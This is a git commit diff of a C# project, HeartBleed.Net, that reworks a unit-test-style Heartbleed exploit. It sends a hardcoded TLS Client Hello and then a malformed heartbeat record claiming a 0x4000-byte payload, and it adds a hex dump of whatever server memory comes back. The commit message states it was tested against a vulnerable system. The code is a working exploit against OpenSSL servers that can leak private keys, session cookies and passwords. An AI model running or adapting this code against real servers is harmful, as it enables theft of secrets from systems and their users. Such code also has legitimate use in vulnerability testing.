bc6e3a18108dd7850dff8625d074dd2a62774b3c
Shaw Innes <shaw@immortal.net.au>
2014-04-10 19:14:07 +1000

    Cleanup - Tested against vulnerable system Added HexDump

--- HeartBleed.Net/HeartBleedTests.cs
+++ HeartBleed.Net/HeartBleedTests.cs
@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Linq;
 using Microsoft.VisualStudio.TestTools.UnitTesting;
 using Serilog;
 
@@ -22,7 +23,7 @@ namespace HeartBleed.Net
         
         public enum SSLVersion
         {
-            SSL3_VERSION = 0x0300,
+            SSL3_0_VERSION = 0x0300,
             TLS1_0_VERSION = 0x0301,
             TLS1_1_VERSION = 0x0302,
             TLS1_2_VERSION = 0x0303,
@@ -51,25 +52,6 @@ namespace HeartBleed.Net
             SSL3_MT_FINISHED = 20,
         }                    
         
-        byte[] hello = {
-	                    0x16, 0x03, 0x02, 0x00, 0xdc, 0x01, 0x00, 0x00, 0xd8, 0x03, 0x02, 0x53, 0x43, 0x5b, 0x90, 0x9d,
-	                    0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc,
-	                    0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde, 0x00, 0x00, 0x66, 0xc0, 0x14,
-	                    0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87, 0xc0, 0x0f,
-	                    0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b, 0x00, 0x16,
-	                    0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f, 0xc0, 0x1e,
-	                    0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e, 0xc0, 0x04,
-	                    0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02, 0x00, 0x05,
-	                    0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08, 0x00, 0x06,
-	                    0x00, 0x03, 0x00, 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
-	                    0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
-	                    0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
-	                    0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
-	                    0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x01,
-	                    0x01 };
-
-        byte[] heartbeat = { 0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x40, 0x00 };
-
         private bool ReceiveHeader(System.Net.Sockets.Socket socket, ref byte type, ref ushort version, ref ushort length)
         {
             byte[] buffer = new byte[SSL3_RT_HEADER_LENGTH];
@@ -92,6 +74,9 @@ namespace HeartBleed.Net
         private bool ReceiveData(System.Net.Sockets.Socket socket, ref ushort length, ref byte[] buffer)
         {
             buffer = new byte[length];
+            
+            // quick hack for now
+            System.Threading.Thread.Sleep(1500);
 
             int receive = socket.Receive(buffer, length, System.Net.Sockets.SocketFlags.None);
             if (receive != length)
@@ -105,25 +90,78 @@ namespace HeartBleed.Net
 
         private void HexDump(byte[] buffer, ushort length)
         {
-            throw new NotImplementedException();
+            int bytesPerLine = 16;
+            string hexDump = buffer.Select((c, i) => new { Char = c, Chunk = i / bytesPerLine })
+                .GroupBy(c => c.Chunk)
+                .Select(g => g.Select(c => String.Format("{0:X2} ", c.Char)).Aggregate((s, i) => s + i))
+                .Select((s, i) => String.Format("{0:d6}: {1}", i * bytesPerLine, s))
+                .Aggregate("", (s, i) => s + i + Environment.NewLine);
+
+            Log.Information(hexDump);
+        }
+
+        public byte[] GetHello(SSLVersion version)
+        {
+            byte[] data = {
+	                    0x16, 0x03, 0x02, 0x00, 0xdc, 0x01, 0x00, 0x00, 0xd8, 0x03, 0x02, 0x53, 0x43, 0x5b, 0x90, 0x9d,
+	                    0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc,
+	                    0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde, 0x00, 0x00, 0x66, 0xc0, 0x14,
+	                    0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87, 0xc0, 0x0f,
+	                    0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b, 0x00, 0x16,
+	                    0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f, 0xc0, 0x1e,
+	                    0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e, 0xc0, 0x04,
+	                    0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02, 0x00, 0x05,
+	                    0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08, 0x00, 0x06,
+	                    0x00, 0x03, 0x00, 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
+	                    0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
+	                    0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
+	                    0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
+	                    0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x01,
+	                    0x01 };
+            
+            byte hiByte = (byte)((ushort)version >> 8 & 0xff);
+            byte loByte = (byte)((ushort)version & 0xff);
+
+            data[1] = hiByte;
+            data[2] = loByte;
+            data[9] = hiByte;
+            data[10] = loByte;
+
+            return data;
+        }
+
+        public byte[] GetHeartBeat(SSLVersion version)
+        {
+            byte[] data = { 0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x40, 0x00 };
+
+            byte hiByte = (byte)((ushort)version >> 8 & 0xff);
+            byte loByte = (byte)((ushort)version & 0xff);
+
+            data[1] = hiByte;
+            data[2] = loByte;
+
+            return data;
         }
 
         [TestMethod]
         public void TestMethod1()
         {
-            string host = "10.0.52.25";
-            int port = 443;
+            string host = "10.0.1.2";
+            int port = 5001;
 
             Log.Logger = new LoggerConfiguration()
                                 .WriteTo.Trace()
                                 .CreateLogger();
 
+            SSLVersion requestedVersion = SSLVersion.TLS1_2_VERSION;
             using (System.Net.Sockets.Socket socket = new System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.IP))
             {
-                Log.Information("Connecting Socket");
+                Log.Information("Trying " + requestedVersion + "...");
+                Log.Information("Connecting...");
                 socket.Connect(host, port);
 
-                Log.Information("Sending HELLO");
+                Log.Information("Sending Client Hello...");
+                byte[] hello = GetHello(requestedVersion);
                 if (socket.Send(hello) != hello.Length)
                     throw new InvalidOperationException("Error while sending HELLO");
 
@@ -131,44 +169,52 @@ namespace HeartBleed.Net
                 byte type = 0;
                 ushort version = 0;
                 ushort length = 0;
+                bool done = false;
 
-                Log.Information("Receiving HELLO");
-                if (!ReceiveHeader(socket, ref type, ref version, ref length))
-                    throw new InvalidOperationException("Error while receiving header");
-
-                Log.Information("ReceiveHeader {Type} {Version} {Length}", (SSLHeaderType)type, (SSLVersion)version, length);
-
-                if (!ReceiveData(socket, ref length, ref buffer))
-                    throw new InvalidOperationException("Error while receiving data");
-
-                if ((SSLHeaderType)type == SSLHeaderType.SSL3_RT_HANDSHAKE)
+                Log.Information("Waiting for Server Hello...");
+                while (!done)
                 {
-                    int offset = 0;
-                    while (offset < length)
+                    if (!ReceiveHeader(socket, ref type, ref version, ref length))
+                        throw new InvalidOperationException("Error while receiving header");
+
+                    Log.Information("\tReceive Header {Type} {Version} {Length}", (SSLHeaderType)type, (SSLVersion)version, length);
+
+                    if (!ReceiveData(socket, ref length, ref buffer))
+                        throw new InvalidOperationException("Error while receiving data");
+
+                    if ((SSLHeaderType)type == SSLHeaderType.SSL3_RT_HANDSHAKE)
                     {
-                        SSLHandshakeType handshake = (SSLHandshakeType)buffer[offset];
+                        int offset = 0;
+                        // This code will handle situations against IIS etc with multiple handshakes
+                        while (!done && offset < length)  
+                        {
+                            SSLHandshakeType handshake = (SSLHandshakeType)buffer[offset];
 
-                        if (handshake == SSLHandshakeType.SSL3_MT_SERVER_DONE)
-                            break;
+                            if (handshake == SSLHandshakeType.SSL3_MT_SERVER_DONE)
+                            {
+                                done = true;
+                            }
 
-                        int handshakeLength = ((buffer[offset + 1] << 16) | (buffer[offset + 2] << 8) | buffer[offset + 3]);
+                            int handshakeLength = ((buffer[offset + 1] << 16) | (buffer[offset + 2] << 8) | buffer[offset + 3]);
 
-                        Log.Information("Receive Data {Type} {Length}", (SSLHandshakeType)handshake, handshakeLength);
+                            Log.Information("\tReceive Data {Type} {Length}", (SSLHandshakeType)handshake, handshakeLength);
 
-                        offset += 4; // skip header
-                        offset += handshakeLength;
+                            offset += 4; // skip header
+                            offset += handshakeLength;
+                        }
                     }
                 }
 
-                Log.Information("Sending HEARTBEAT");
+                Log.Information("Sending heartbeat request...");
+                byte[] heartbeat = GetHeartBeat(requestedVersion);
                 if (socket.Send(heartbeat) != heartbeat.Length)
                     throw new InvalidOperationException("Error while sending HEARTBEAT");
 
-                Log.Information("Receiving HEARTBEAT");
+                Log.Information("Waiting for heartbeat response...");
                 if (!ReceiveHeader(socket, ref type, ref version, ref length))
                     throw new InvalidOperationException("Error while receiving header");
 
-                if ((SSLHeaderType)type != SSLHeaderType.SSL3_RT_HEARTBEAT)
+                if (type != (byte)SSLHeaderType.SSL3_RT_HEARTBEAT)
                     throw new InvalidOperationException("Invalid HEARTBEAT response");
 
                 if (!ReceiveData(socket, ref length, ref buffer))
